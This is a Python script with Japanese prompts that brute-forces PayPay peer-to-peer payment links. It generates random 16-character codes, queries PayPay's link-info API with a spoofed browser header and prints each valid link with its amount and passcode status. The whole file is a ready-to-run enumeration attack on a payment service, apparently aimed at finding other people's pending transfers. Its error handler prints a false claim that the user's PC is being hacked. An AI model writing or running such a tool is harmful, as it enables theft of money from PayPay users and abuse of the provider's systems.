import requests
import random, string
import os
import time


times = int(input("作る＆確認する回数を入れてください : "))
origin_path = os.getcwd()
def randomname():
   return ''.join(random.choices(string.ascii_letters + string.digits, k=16))

def check_link():
    for i in range(times):
        origin = "https://pay.paypay.ne.jp/"
        query = randomname()
        url =  f"{origin}{query}"
        header = {
            "Accept":"application/json, text/plain, */*",
            "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
        }
        params = {
            "verificationCode": query
        }
        try:
            r = requests.get(f"https://www.paypay.ne.jp/app/v2/p2p-api/getP2PLinkInfo",headers=header,params=params)

            if r.json()["header"]["resultCode"] == "S0000":
                infor = r.json()["payload"]["pendingP2PInfo"]

                print(f"有効 : {url} │ 値段 : {infor["amount"]} │ パスコード : {infor["isSetPasscode"]}")
            elif r.json()["header"]["resultCode"] == "S5000":

                print(f"無効 : {url}")
            else:
                print(f"エラー : {url}")
            time.sleep(1)
        except:
            print("何らかのエラーが起きてpcがハッキングされています・・・")
            
            break

    input()

if __name__ == '__main__':

    check_link()